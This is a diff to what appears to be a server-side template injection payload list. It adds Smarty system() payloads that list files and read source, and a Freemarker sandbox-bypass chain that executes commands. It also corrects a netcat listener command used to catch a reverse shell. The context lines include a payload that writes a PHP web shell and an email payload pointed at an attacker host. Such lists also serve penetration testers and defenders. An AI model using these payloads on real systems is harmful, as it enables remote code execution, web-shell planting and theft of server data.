@@ -233,8 +233,10 @@ email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 
 ```python
 {$smarty.version}
-{php}echo `id`;{/php}
+{php}echo `id`;{/php} //deprecated in smarty v3
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('ls')} // compatible v3
+{system('cat index.php')} // compatible v3
 ```
 
 ## Freemarker
@@ -251,6 +253,18 @@ The template can be `${3*3}` or the legacy `#{3*3}`
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
 ${"freemarker.template.utility.Execute"?new()("id")}
+```
+
+### Freemarker - Sandbox bypass
+
+:warning: only works on Freemarker versions below 2.3.30
+
+```js
+<#assign classloader=article.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("id")}
 ```
 
 ## Pebble
@@ -396,7 +410,7 @@ Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
 Listen for connection
 
 ```bash
-nv -lnvp 8000
+nc -lnvp 8000
 ```
 
 #### Exploit the SSTI by calling subprocess.Popen.
